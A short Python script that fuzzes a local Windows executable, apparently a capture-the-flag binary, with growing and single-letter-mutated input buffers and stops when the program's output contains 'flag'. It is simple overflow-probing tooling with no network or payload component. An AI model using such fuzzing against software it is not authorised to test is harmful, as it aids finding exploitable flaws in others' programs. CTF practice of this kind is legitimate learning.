import subprocess
import os
import time
import sys
import string
from colorama import init, Fore, Style

init(autoreset=True)  # Initialize colorama

def run_program(input_program, buffer):
    proc = subprocess.Popen([f'.\\{input_program}.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    proc.stdin.write(buffer)
    proc.stdin.flush()

    output = proc.stdout.read().decode()

    proc.stdin.close()
    proc.stdout.close()
    proc.wait()

    return output

while True:
    input_program = input(Fore.GREEN + "Enter the program name you want to fuzz and exploit :) > " + Style.RESET_ALL)
    if os.path.isfile(f'./{input_program}.exe'):
        break
    else:
        print(Fore.RED + f"Program {input_program}.exe does not exist. Please enter a valid program name." + Style.RESET_ALL)

try:
    for length in range(20, 65):
        buffer = b"A" * length
        sys.stdout.write(f'\rTrying with buffer: {buffer}{" " * (64 - len(buffer))}')
        sys.stdout.flush()
        output = run_program(input_program, buffer)
        if "flag" in output:
            print(f"\n{Fore.GREEN}Flag found! The vulnerability was exploited with a buffer of length {length}, using length fuzzing." + Style.RESET_ALL)
            sys.exit()

except Exception as e:
    print(f"\nFuzzing crash at {length} bytes")
    print(e)
    sys.exit()

print(Fore.RED + "\nNo vulnerabilities were found. The program is not vulnerable to this type of fuzzing.\n" + Style.RESET_ALL)

for length in range(40, 42):
    base_buffer = b"a" * length
    for index in range(length):
        for char in string.ascii_letters:  # Try uppercase and lowercase letters
            try:
                buffer = bytearray(base_buffer)
                buffer[index] = ord(char)
                sys.stdout.write(f'\rTrying with buffer: {buffer}{" " * (64 - len(buffer))}')
                sys.stdout.flush()
                output = run_program(input_program, buffer)

                if "flag" in output:
                    print(f"\n{Fore.GREEN}Flag found! The vulnerability was exploited with the buffer {len(buffer)}, using mutation fuzzing.\n" + Style.RESET_ALL)
                    print(f"{Fore.YELLOW}The output of the program =\n")
                    print(output)
                    sys.exit()

            except Exception as e:
                print(f"\nFuzzing crash at {buffer}")
                print(e)
                sys.exit()
